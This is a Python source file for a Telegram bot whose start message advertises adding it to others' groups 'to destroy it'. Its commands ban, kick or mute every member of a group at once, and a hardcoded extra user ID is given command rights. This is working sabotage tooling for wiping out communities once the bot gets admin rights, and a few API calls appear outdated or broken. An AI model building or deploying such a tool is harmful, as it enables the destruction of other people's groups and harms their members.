from hasnainkk import app, START_IMG, BOT_USERNAME, BOT_NAME, LOG, BOT_ID, SUDO
from pyrogram import filters
from hasnainkk.utils.hasnainkk import admin_filter
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery, ChatPermissions

SPECIAL_USER_ID = 6346273488

START_MSG = """
ʜᴇʏ **{}**, ɪ ᴀᴍ {},
ɪ ʜᴀᴠᴇ sᴏᴍᴇ ɪɴᴛᴇʀᴇsᴛɪɴɢ ᴘʟᴜɢɪɴs ʏᴏᴜ sʜᴏᴜʟᴅ ᴛʀʏ ɪᴛ ʙʏ ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ʜᴇʟᴘ ʙᴜᴛᴛᴏɴ.
ᴀᴅᴅ ᴍᴇ ɪɴ ᴏᴛʜᴇʀs ɢʀᴏᴜᴘ ᴛᴏ ᴅᴇsᴛʀᴏʏ ɪᴛ.
"""

START_BUTTONS = InlineKeyboardMarkup(
    [
        [
            InlineKeyboardButton(text="➕ ᴀᴅᴅ ᴍᴇ ➕", url=f"https://t.me/{BOT_USERNAME}?startgroup=true")
        ],
        [
            InlineKeyboardButton(text="ʜᴇʟᴘ", callback_data="help_back")
        ]
    ]
)

HELP_MSG = """
**ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅs ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜsᴇᴅ ɪɴ ɢʀᴏᴜᴘs**

• /banall : ʙᴀɴ-ᴀʟʟ ᴍᴇᴍʙᴇʀs ɪɴ ᴀ ɢʀᴏᴜᴘ

• /unbanall : ᴜɴʙᴀɴ ᴀʟʟ ᴍᴇᴍʙᴇʀs ɪɴ ᴀ ɢʀᴏᴜᴘ

• /kickall : ᴋɪᴄᴋ ᴀʟʟ ᴍᴇᴍʙᴇʀs ɪɴ ᴀ ɢʀᴏᴜᴘ

• /muteall : ᴍᴜᴛᴇ ᴀʟʟ ᴍᴇᴍʙᴇʀs ɪɴ ᴀ ɢʀᴏᴜᴘ

• /unmuteall : ᴜɴᴍᴜᴛᴇ ᴀʟʟ ᴍᴇᴍʙᴇʀs ɪɴ ᴀ ɢʀᴏᴜᴘ(sᴛɪʟʟ ᴡɪʟʟ ᴛʜᴇ ʟɪsᴛ ɪɴ ʀᴇsᴛʀɪᴄᴛᴇᴅ ᴍᴇᴍʙᴇʀs ʙᴜᴛ ᴀʟʟ ʀᴇsᴛʀɪᴄᴛɪᴏɴs ᴡɪʟʟ ɢᴏ)

• /unpinall : ᴜɴᴘɪɴ ᴀʟʟ ᴍᴇssᴀɢᴇs ɪɴ ᴀ ɢʀᴏᴜᴘ.

ᴄʀᴇᴀᴛᴇᴅ ʙʏ: [Hasnain khan](https://t.me/hasnainkk)
"""

@app.on_message(filters.command("start"))
async def start(_, msg):
    await msg.reply_photo(
        photo=START_IMG,
        caption=START_MSG.format(msg.from_user.mention, BOT_NAME),
        reply_markup=START_BUTTONS
    )

@app.on_callback_query(filters.regex("help_back"))
async def help_back(_, callback_query: CallbackQuery):
    query = callback_query.message
    await query.edit_caption(HELP_MSG)

@app.on_message(filters.command("banall") & admin_filter & filters.user(SUDO | SPECIAL_USER_ID))
async def ban_all(_, msg):
    chat_id = msg.chat.id
    bot = await app.get_chat_member(chat_id, BOT_ID)
    bot_permission = bot.privileges.can_restrict_members

    if bot_permission:
        async for member in app.get_chat_members(chat_id):
            try:
                await app.ban_chat_member(chat_id, member.user.id)
                await msg.reply_text(f"ʙᴀɴɴɪɴɢ {member.user.mention}")
            except Exception:
                pass
    else:
        await msg.reply_text("ᴇɪᴛʜᴇʀ ɪ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛʜᴇ ʀɪɢʜᴛ ᴛᴏ ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀs ᴏʀ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ɪɴ sᴜᴅᴏ ᴜsᴇʀs")

@app.on_message(filters.command("unbanall") & admin_filter & filters.user(SUDO | SPECIAL_USER_ID))
async def unban_all(_, msg):
    chat_id = msg.chat.id
    banned_users = []

    bot = await app.get_chat_member(chat_id, BOT_ID)
    bot_permission = bot.privileges.can_restrict_members

    if bot_permission:
        async for m in app.get_chat_members(chat_id, filter="banned"):
            banned_users.append(m.user.id)
            try:
                await app.unban_chat_member(chat_id, banned_users[-1])
                await msg.reply_text(f"ᴜɴʙᴀɴɪɴɢ {m.user.mention}")
            except Exception:
                pass
    else:
        await msg.reply_text("ᴇɪᴛʜᴇʀ ɪ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛʜᴇ ʀɪɡʜᴛ ᴛᴏ ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀs ᴏʀ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ɪɴ sᴜᴅᴏ ᴜsᴇʀs")

@app.on_message(filters.command("kickall") & admin_filter & filters.user(SUDO | SPECIAL_USER_ID))
async def kick_all(_, msg):
    chat_id = msg.chat.id
    bot = await app.get_chat_member(chat_id, BOT_ID)
    bot_permission = bot.privileges.can_restrict_members

    if bot_permission:
        async for member in app.get_chat_members(chat_id):
            try:
                await app.kick_chat_member(chat_id, member.user.id)
                await msg.reply_text(f"ᴋɪᴄᴋɪɴɢ {member.user.mention}")
            except Exception:
                pass
    else:
        await msg.reply_text("ᴇɪᴛʜᴇʀ ɪ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛʜᴇ ʀɪɡʜᴛ ᴛᴏ ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀs ᴏʀ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ɪɴ sᴜᴅᴏ ᴜsᴇʀs")

@app.on_message(filters.command("muteall") & admin_filter & filters.user(SUDO | SPECIAL_USER_ID))
async def mute_all(_, msg):
    chat_id = msg.chat.id
    bot = await app.get_chat_member(chat_id, BOT_ID)
    bot_permission = bot.privileges.can_restrict_members

    if bot_permission:
        async for member in app.get_chat_members(chat_id):
            try:
                await app.restrict_chat_member(chat_id, member.user.id, ChatPermissions(can_send_messages=False))
                await msg.reply_text(f"ᴍᴜᴛɪɴɢ {member.user.mention}")
            except Exception:
                pass
    else:
        await msg.reply_text("ᴇɪᴛʜᴇʀ ɪ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛʜᴇ ʀɪɡʜᴛ ᴛᴏ ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀs ᴏʀ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ɪɴ sᴜᴅᴏ ᴜsᴇʀs")

@app.on_message(filters.command("unmuteall") & admin_filter & filters.user(SUDO | SPECIAL_USER_ID))
async def unmute_all(_, msg):
    chat_id = msg.chat.id
    bot = await app.get_chat_member(chat_id, BOT_ID)
    bot_permission = bot.privileges.can_restrict_members

    if bot_permission:
        async for member in app.get_chat_members(chat_id):
            try:
                await app.restrict_chat_member(chat_id, member.user.id, ChatPermissions(can_send_messages=True))
                await msg.reply_text(f"ᴜɴᴍᴜᴛɪɴɢ {member.user.mention}")
            except Exception:
                pass
    else:
        await msg.reply_text("ᴇɪᴛʜᴇʀ ɪ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛʜᴇ ʀɪɡʜᴛ ᴛᴏ ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀs ᴏʀ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ɪɴ sᴜᴅᴏ ᴜsᴇʀs")

@app.on_message(filters.command("unpinall") & admin_filter & filters.user(SUDO | SPECIAL_USER_ID))
async def unpin_all(_, msg):
    chat_id = msg.chat.id
    bot = await app.get_chat_member(chat_id, BOT_ID)
    bot_permission = bot.privileges.can_pin_messages

    if bot_permission:
        async for message in app.get_chat_history(chat_id):
            try:
                await app.unpin_chat_message(chat_id, message.message_id)
                await msg.reply_text(f"ᴜɴᴘɪɴɪɴɢ ᴍᴇssᴀɢᴇ {message.message_id}")
            except Exception:
                pass
    else:
        await msg.reply_text("ᴇɪᴛʜᴇʀ ɪ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛʜᴇ ʀɪɡʜᴛ ᴛᴏ ᴘɪɴ ᴏʀ ᴜɴᴘɪɴ ᴍᴇssᴀɢᴇs ᴏʀ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ɪɴ sᴜᴅᴏ ᴜsᴇʀs")

# Add any additional modules or command handlers here

# Start the bot
if __name__ == "__main__":
    app.run()
